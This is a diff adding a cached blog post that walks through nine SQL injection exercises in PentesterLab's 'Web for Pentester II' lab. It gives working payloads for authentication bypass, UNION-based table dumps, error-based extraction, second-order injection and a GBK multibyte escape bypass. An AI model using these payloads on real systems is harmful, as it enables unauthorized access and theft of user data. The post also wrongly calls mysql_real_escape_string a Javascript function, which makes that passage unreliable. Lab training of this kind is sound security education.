@@ -1,0 +1,89 @@
+I"#<h1 id="background">Background</h1>
+<p>SQL injection is a type of vulnerability of many databases. It is often possible to insert your own sql query into the origin sql query to bypass the authentication page or to get sensitive information. There are a bunch of good examples for web penetration testing in <a href="http://pentesterlab.com">Pentester Lab</a>. In this article, we will go through each one in the tutorial <a href="https://pentesterlab.com/exercises/web_for_pentester_II">Web for Pentester II</a>. Make sure you allocate &gt;= 1 GB RAM, and setup host-only network. Open the page with the IP of the VM (get the IP using nmap or type ifconfig in the VM)</p>
+
+<h1 id="solutions">Solutions</h1>
+<h3 id="example-1">Example 1</h3>
+<p>This is the most basic injection code. Type the following in the username. As the course of pentester lab stated, password is usually hashed or encrypted, so it is better to perform this in username.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' or 1=1 #</span></code></pre></figure>
+
+<p>Note that assume the original query is like</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'******'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'******'</span></code></pre></figure>
+
+<p>single quote <code class="language-plaintext highlighter-rouge">'</code> can be used to escape from string, and insert query. After we send the request, the query would be like</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">#</span> <span class="s1">' AND password=</span><span class="se">''</span></code></pre></figure>
+
+<p>The WHERE clause became always true, and things after # was commented out, so then the server got a result, and we are done.</p>
+
+<h3 id="example-2">Example 2</h3>
+<p>In this example, the number of users returned is restricted.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' or 1=1 LIMIT 1 #</span></code></pre></figure>
+
+<h3 id="example-3">Example 3</h3>
+<p>In this example, single quotes are removed in the query, but it’s still breakable by using escape <code class="language-plaintext highlighter-rouge">\</code>. The query will become like</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'</span><span class="se">\'</span><span class="s1"> AND password='</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">#</span><span class="s1">'</span></code></pre></figure>
+
+<p>The second single quote is turned to a character by backslash. The actual username in the query is “' AND password=”. The string is closed by the first quote of password.</p>
+
+<h3 id="example-4">Example 4</h3>
+<p>There is no text box, so look at the address bar.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">/</span><span class="n">example4</span><span class="o">/?</span><span class="n">req</span><span class="o">=</span><span class="n">username</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="o">%</span><span class="mi">27</span><span class="n">hacker</span><span class="o">%</span><span class="mi">27</span></code></pre></figure>
+
+<p>Decode the url,</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">username</span><span class="o">=</span><span class="s1">'hacker'</span></code></pre></figure>
+
+<p>This gives the server a username, and this string is likely to be in WHERE clause. To confirm this, change the url to</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">/</span><span class="n">example4</span><span class="o">/?</span><span class="n">req</span><span class="o">=</span><span class="n">username</span><span class="o">=</span><span class="s1">'</span></code></pre></figure>
+
+<p>This gives you an sql query error, which shows the actual query. The entire string after “req=” is in WHERE clause. Chagne the url to this.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">/</span><span class="n">example4</span><span class="o">/?</span><span class="n">req</span><span class="o">=</span><span class="s1">' or 1=1 #</span></code></pre></figure>
+
+<h3 id="example-5">Example 5</h3>
+<p>This is a union-based SQL injection.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">/</span><span class="n">example5</span><span class="o">/?</span><span class="k">limit</span><span class="o">=</span><span class="mi">3</span> <span class="k">union</span> <span class="k">all</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span></code></pre></figure>
+
+<h3 id="example-6">Example 6</h3>
+<p>Change the url to</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">/</span><span class="n">example5</span><span class="o">/?</span><span class="k">group</span><span class="o">=</span><span class="n">username</span> <span class="k">union</span> <span class="k">all</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span></code></pre></figure>
+
+<p>or simple delete group</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">/</span><span class="n">example5</span><span class="o">/?</span></code></pre></figure>
+
+<p>This is a dump example using group by.</p>
+
+<h3 id="example-7">Example 7</h3>
+<p>Pentester lab provides an error-pone statement,</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">extractvalue</span><span class="p">(</span><span class="s1">'%3Cxml%3E'</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="o">%</span><span class="mi">22</span><span class="o">/%</span><span class="mi">22</span><span class="p">,(</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="k">version</span><span class="p">())))</span></code></pre></figure>
+
+<p>but I prefer to just use a single quote here, which has the same result on web for pentester II pages.
+With an error message displayed, you can easily see the structure of the query.
+<img src="/img/2015-08-20-sql-injection-web-for-pentester-II-1.png" alt="errmsg" width="600px" /> 
+Same as example 6, delete suffix or use union-based injection to display all users.</p>
+
+<h3 id="example-8">Example 8</h3>
+<p>Create a few users randomly first. Create a new user named the following:</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' union all select * from users where username='</span><span class="n">whatever_you_want_to_check</span><span class="s1">' #
+or 
+'</span> <span class="k">union</span> <span class="k">all</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'whichever_you_want_to_check'</span> <span class="o">#</span></code></pre></figure>
+
+<p>With this user, you may check any user you want. The vulnerability of this one is that the value coming crom database is usually seen as trustable.</p>
+
+<h3 id="example-9">Example 9</h3>
+<p>This page uses a Javascript function  mysql_real_escape_string(), which removes any escape that you enter in. However, this function does not work properly with GBK character. with a GBK character, followed by a single quote, this quote will not be removed. Enter the following to bypass the authentication.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="err">呵</span><span class="s1">' or 1=1 #</span></code></pre></figure>
+
+:ET
